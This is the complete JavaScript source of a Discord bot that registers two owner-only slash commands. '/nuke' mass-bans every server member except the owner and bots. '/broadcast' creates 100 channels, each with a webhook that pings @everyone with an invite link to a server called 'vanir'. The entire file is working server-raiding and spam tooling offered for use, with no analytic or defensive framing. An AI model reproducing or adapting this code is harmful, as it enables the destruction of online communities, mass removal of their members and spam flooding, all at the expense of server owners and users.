const express = require('express');
const { 
  Client, 
  GatewayIntentBits, 
  Partials, 
  SlashCommandBuilder, 
  REST, 
  Routes, 
  PermissionFlagsBits, 
  ChannelType 
} = require('discord.js');
require('dotenv').config();

// Express server for Render
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is running'));
app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));

// Discord client setup
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

const bannedUsers = new Set();

client.once('ready', async () => {
  console.log(`🤖 Logged in as ${client.user.tag}`);

  const commands = [
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all members (except owner & bots)')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('broadcast')
      .setDescription('Create 100 channels and ping @everyone with invite')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON()
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(
    Routes.applicationCommands(client.user.id), // GLOBAL commands
    { body: commands }
  );

  console.log('✅ Global slash commands registered (may take up to 1 hour to appear)');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const guild = interaction.guild;

  if (!guild) return interaction.reply('❌ This command can only be used in a server.');

  // /nuke
  if (interaction.commandName === 'nuke') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
    }

    await interaction.reply('⚠️ Type `CONFIRM` within 15 seconds to start banning all members.');

    const filter = m => m.author.id === interaction.user.id && m.content === 'CONFIRM';
    try {
      await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });

      const members = await guild.members.fetch();
      for (const [id, member] of members) {
        if (id === process.env.OWNER_ID || member.user.bot) continue;

        try {
          if (!bannedUsers.has(id)) {
            await member.ban({ reason: 'Nuke command used' });
            bannedUsers.add(id);
            console.log(`🔨 Banned ${member.user.tag}`);
          }
        } catch (err) {
          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
        }
      }

      interaction.followUp('✅ All possible members have been banned.');
    } catch {
      interaction.followUp('❌ Timed out or cancelled.');
    }
  }

  // /broadcast
  if (interaction.commandName === 'broadcast') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this.', ephemeral: true });
    }

    await interaction.reply('📡 Creating 100 channels with webhook pings...');

    for (let i = 1; i <= 100; i++) {
      try {
        const channel = await guild.channels.create({
          name: `vanir-${i}`,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: ['ViewChannel', 'SendMessages'],
            },
          ],
        });

        const webhook = await channel.createWebhook({
          name: `VanirWebhook-${i}`,
          avatar: client.user.displayAvatarURL(),
        });

        await webhook.send({
          content: `@everyone https://discord.gg/vanir`,
          allowedMentions: { parse: ['everyone'] }
        });

        console.log(`✅ Sent message in channel vanir-${i}`);
        await new Promise(res => setTimeout(res, 500)); // delay to avoid rate limits
      } catch (err) {
        console.error(`❌ Error in vanir-${i}: ${err.message}`);
      }
    }

    interaction.followUp('✅ All channels and messages sent.');
  }
});

// Global error handlers
process.on('unhandledRejection', (reason) => {
  console.error('🧨 Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('💥 Uncaught Exception:', err);
});

client.login(process.env.TOKEN);
